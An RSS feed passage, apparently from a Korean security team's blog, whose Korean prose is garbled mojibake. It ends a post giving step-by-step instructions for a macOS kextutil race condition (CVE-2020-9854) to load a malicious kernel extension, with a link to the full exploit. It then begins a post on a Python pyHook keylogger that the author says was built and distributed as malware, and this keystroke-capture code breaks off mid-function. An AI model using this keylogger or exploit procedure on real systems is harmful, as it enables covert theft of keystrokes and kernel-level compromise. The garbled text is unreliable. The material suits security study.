&lt;p&gt;ì´ë¡ ì ìœ¼ë¡œ kextutilì´ kextë¥¼ í•œ ë²ˆë§Œ ì—´ì–´ ëª¨ë“  íŒŒì¼ì„ ë¡œë“œí•˜ê³  ê²€ì‚¬ë¥¼ ìˆ˜í–‰ í•œ ë‹¤ìŒ ë©”ëª¨ë¦¬ì—ì„œ íŒŒì¼ì„ ë¡œë“œí•˜ë©´ ë¬¸ì œê°€ ì—†ë‹¤. íŒŒì¼ ë””ìŠ¤í¬ë¦½í„°ë¥¼ ì‚¬ìš©í•˜ë©´ ì´ ë¬¸ì œë¥¼ ì™„í™” í•  ìˆ˜ ìˆì§€ë§Œ ì‹¤ì œë¡œëŠ” kextê°€ í™•ì¸ë˜ëŠ” ì‹œì ê³¼ ì»¤ë„ì— ë¡œë“œë˜ëŠ” ì‹œì  ì‚¬ì´ì— ê²½ìŸ ì¡°ê±´ì´ ìˆë‹¤.&lt;/p&gt;

&lt;p&gt;ì•„ë˜ì˜ ë°©ë²•ìœ¼ë¡œ 100% ë ˆì´ìŠ¤ ì»¨ë””ì…˜ì„ ì„±ê³µì‹œí‚¬ ìˆ˜ ìˆë‹¤.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Appleì˜ ì„œëª…ì´ëœ ì»¤ë„ ëª¨ë“ˆì„ non-SIP protectedì¸ ê³³(ex. acfs.kext)ìœ¼ë¡œ ë³µì‚¬í•œë‹¤.&lt;/li&gt;
  &lt;li&gt;kextutl -interactive /tmp/acfs.textë¥¼ ì‹¤í–‰í•œë‹¤. (ktextutilì´ ìë™ìœ¼ë¡œ ì„œëª…ì„ ê²€ì¦í•  ê²ƒì´ë‹¤.)&lt;/li&gt;
  &lt;li&gt;ë°”ì´ë„ˆë¦¬ë¥¼ ë®ì–´ì“´ë‹¤. (ex. mv kernelHax /Library/StagedExtensions/private/tmp/acfs.kext/Contents/MacOS/acfs)&lt;/li&gt;
  &lt;li&gt;kextutilì— ê³„ì†í•˜ë„ë¡ ìš”ì²­ì„ ë³´ë‚´ê³  ì•…ì„±ì½”ë“œë¥¼ í¬í•¨í•œ kextë¥¼ ì»¤ë„ì— ë¡œë“œ í•œë‹¤.&lt;/li&gt;
  &lt;li&gt;kextutilì— í•œë²ˆë” ê³„ì†í•˜ë„ë¡ ìš”ì²­ì„ ë³´ë‚´ë©´ ì»¤ë„ ëª¨ë“ˆì´ ë™ì‘í•˜ë„ë¡ ì‘ë™í•  ê²ƒì´ë‹¤.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;ì „ì²´ ì¸ìŠ¤í”Œë¡œì‡ ë§í¬&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/A2nkF/unauthd&quot;&gt;https://github.com/A2nkF/unauthd&lt;/a&gt;&lt;/p&gt;
</description>
        <pubDate>Wed, 01 Jul 2020 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/2020-07-01/MacOS-LPE-CVE-2020-9854</link>
        <guid isPermaLink="true">http://localhost:4000/2020-07-01/MacOS-LPE-CVE-2020-9854</guid>
        
        <category>cve</category>
        
        
      </item>
    
      <item>
        <title>Keylogger and Other Functions</title>
        <description>&lt;p&gt;ë¼ì˜¨í™”ì´íŠ¸í–‡ í•µì‹¬ì—°êµ¬íŒ€ ì¡°ìš´ì‚¼&lt;/p&gt;

&lt;h2 id=&quot;i-intro&quot;&gt;I. Intro&lt;/h2&gt;

&lt;hr /&gt;

&lt;p&gt;ì§€ë‚œ í”„ë¡œì íŠ¸ íˆ¬ì… ë•Œ, ìˆ˜í–‰í•œ ì‹œë‚˜ë¦¬ì˜¤ì—ì„œ ì‚¬ìš©ëœ Keylogger í˜•íƒœì˜ ì•…ì„±ì½”ë“œë¥¼ ì œì‘&amp;amp;ë°°í¬ í–ˆì„ ë•Œ ì‚¬ìš©í•œ ê¸°ëŠ¥ë“¤ì— ëŒ€í•´ ì •ë¦¬í•´ë´¤ìŠµë‹ˆë‹¤.  ì¶”í›„ ìœ ì‚¬í•œ ë‚´ìš©ì˜ í”„ë¡œì íŠ¸ í˜¹ì€ ê°œë°œì‹œ ì°¸ê³ í•˜ë©´ ê°ì‚¬í•˜ê² ìŠµë‹ˆë‹¤. (ê°œë°œì— ì‚¬ìš©í•œ ì–¸ì–´ëŠ” Pythonì…ë‹ˆë‹¤.)&lt;/p&gt;

&lt;h2 id=&quot;ii-functions&quot;&gt;II. Functions&lt;/h2&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;ii-01-keylogger&quot;&gt;II-01 .Keylogger&lt;/h3&gt;

&lt;p&gt;ì£¼ìš” ê¸°ëŠ¥ì¤‘ í•˜ë‚˜ì¸ Keylogger ê¸°ëŠ¥ì€ pyHookì„ ì´ìš©í•˜ì—¬ êµ¬í˜„í•˜ì˜€ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pyHook&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;hm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pyHook&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HookManager&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;hm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KeyDown&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;OnKeyboardEvent&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;hm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KeyUp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;OnKeyboardEvent&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ë³´í†µì€ &lt;code class=&quot;highlighter-rouge&quot;&gt;KeyDown&lt;/code&gt;ì„ ì´ìš©í•˜ì—¬ ì…ë ¥ í‚¤ë¥¼ íŒŒì•…í•˜ëŠ” ê²ƒì´ ì¼ë°˜ì ì´ì§€ë§Œ Shift í‚¤ë¥¼ ì´ìš©í•œ íŠ¹ìˆ˜ë¬¸ì ì…ë ¥ í˜¹ì€ Ctrl, Alt í‚¤ë¥¼ ì´ìš©í•œ ê¸°íƒ€ í‚¤ë³´ë“œ ì´ë²¤íŠ¸ë¥¼ êµ¬ë¶„í•˜ê¸° ìœ„í•´ &lt;code class=&quot;highlighter-rouge&quot;&gt;KeyDown&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;KeyUp&lt;/code&gt;ì„ ì´ìš©í•˜ì—¬ í‚¤ë³´ë“œ ì´ë²¤íŠ¸ë¥¼ êµ¬ë¶„í•˜ì˜€ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;keyboardEventDebug&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'========================================&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'MessageName: {}'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MessageName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Message: {}'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Time: {}'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Window: {}'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'WindowName: {}'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;WindowName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Ascii: {}'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Ascii&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Key: {}'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'KeyID: {}'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KeyID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'ScanCode: {}'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ScanCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Extended: {}'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Extended&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Injected: {}'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Injected&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Alt: {}'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Alt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Transition: {}'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Transition&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'========================================&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;pyHookì—ì„œ ì´ë²¤íŠ¸ ë°œìƒì‹œ ì´ë²¤íŠ¸ ê°ì²´ì— í¬í•¨ë˜ì–´ ìˆëŠ” êµ¬ì„± ìš”ì†Œë“¤ì…ë‹ˆë‹¤. &lt;code class=&quot;highlighter-rouge&quot;&gt;event.Message&lt;/code&gt;ë¥¼ í†µí•´ KeyDown(256), KeyUp(257)ì„ êµ¬ë¶„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;event.Ascii&lt;/code&gt; í˜¹ì€ &lt;code class=&quot;highlighter-rouge&quot;&gt;event.KeyID&lt;/code&gt;ë¥¼ ì‚¬ìš©í•´ ì…ë ¥ëœ í‚¤ë¥¼ êµ¬ë³„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.( &lt;code class=&quot;highlighter-rouge&quot;&gt;event.KeyID&lt;/code&gt;ë¥¼ ì‚¬ìš©í•  ê²½ìš° ì¢€ ë” ë‹¤ì–‘í•œ í‚¤ ì´ë²¤íŠ¸ë¥¼ êµ¬ë³„ í•  ìˆ˜ ìˆì§€ë§Œ, KeyIDì— ëŒ€í•´ ì‚¬ì „ì— íŒŒì•…í•´ì•¼ í•©ë‹ˆë‹¤.)&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;OnKeyboardEvent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lst&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Scroll'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;# capture the keystrokes
&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KeyID&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;keylogs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KeyID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;160&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Message&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;keylogs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[L_Shift Down]'&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KeyID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;160&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Message&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;257&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;keylogs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[L_Shift UP]'&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KeyID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;161&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Message&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;keylogs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[R_Shift Down]'&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KeyID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;161&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Message&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;257&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;keylogs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[R_Shift UP]'&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KeyID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;162&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Message&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;keylogs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[L_Control Down]'&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KeyID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;162&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Message&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;257&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;keylogs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[L_Control UP]'&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Message&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KeyID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;keylogs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[Backspace]'&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KeyID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;keylogs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[Tab]'&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KeyID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;keylogs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[Enter]'&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KeyID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
